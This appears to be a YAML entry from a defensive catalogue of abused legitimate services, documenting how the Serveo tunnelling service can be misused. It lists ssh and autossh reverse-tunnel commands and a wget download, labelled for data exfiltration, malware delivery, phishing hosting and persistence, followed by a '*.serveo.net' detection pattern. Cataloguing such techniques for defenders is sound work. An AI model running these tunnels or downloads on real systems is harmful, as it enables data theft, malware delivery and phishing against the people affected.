---
Name: Serveo
Description: Serveo is an online free alternate to ngrok. Which can be used by the insiders as well as threat actors to expose local systems, services over the internet for data exfiltrations, downloading malicious softwares as well as hosting phishing pages. 

Author: Kamran Saifullah
Created: 2024-10-13
Commands:

  - Command: ssh -R <PORT>:localhost:<PORT> serveo.net
    Description: The command creates a tunnel via serveo to the local port provided in the command. This can be a local service or a web server running locally.
    Usecase: Exposing local services/file system over the internet for data exfiltration. 
    Category: exfiltrate
    Privileges: User
    OperatingSystem: Windows, Mac, Linux

  - Command: wget *.serveo.net
    Description: Threat actors can host malicious binaries on the local system and expose it via serveo.net and have those downloaded on the compromised host. 
    Usecase: Serving malicious binaries to be executed/downloaded on the compromised host.
    Category: download
    Privileges: User
    OperatingSystem: Windows, Mac, Linux

  - Command: ssh -R <PORT>:localhost:<PORT> serveo.net
    Description: Threat actors can host phishing sites locally and can expose them via serveo.net to compromise users.
    Usecase: Hosting phishing site locally and exposing it via serveo.net
    Category: phishing
    Privileges: User
    OperatingSystem: Windows, Mac, Linux

  - Command: autossh -M 0 -R <PORT>:localhost:<PORT> serveo.net
    Description: Threat actors enabling persistence on the compromised host to ensure system automatically gets connected to the serveo.net
    Usecase: Persisting local connections over serveo.net 
    Category: persistence
    Privileges: User
    OperatingSystem: Windows, Mac, Linux

Full_Path:
  - Path: Execution via command line. No need of installation.
Detection:
  - Domain: '*.serveo.net'
Resources:
  - Link: https://serveo.net/
Acknowledgement:
  - Person: Kamran Saifullah
    Handle: '@deFr0ggy'
---